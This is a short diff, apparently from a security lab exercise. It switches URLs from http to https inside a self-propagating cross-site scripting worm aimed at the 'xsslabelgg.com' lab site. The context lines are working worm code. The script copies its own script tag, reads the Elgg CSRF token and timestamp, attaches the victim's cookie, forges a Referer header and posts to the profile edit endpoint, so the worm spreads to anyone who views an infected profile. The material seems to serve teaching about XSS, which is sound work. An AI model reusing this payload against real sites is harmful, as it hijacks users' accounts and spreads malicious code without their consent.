@@ -391,7 +391,7 @@ ff.send(params);
 
 var selfProp = "<script id=\"worm\" type=\"text/javascript\" >".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");
 
-var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+var sendurl="https://www.xsslabelgg.com/action/profile/edit";
 var ts=elgg.security.token__elgg_ts;
 var token=elgg.security.token.__elgg_token;
 
@@ -403,7 +403,7 @@ ff.setRequestHeader("Connection","keep-alive");
 ff.setRequestHeader("Cookie",document.cookie);
 ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 
-ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));
+ff.setRequestHeader("Referer","https://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));
 
 params = "__elgg_ts=".concat(ts)
          .concat("&__elgg_token=").concat(token)
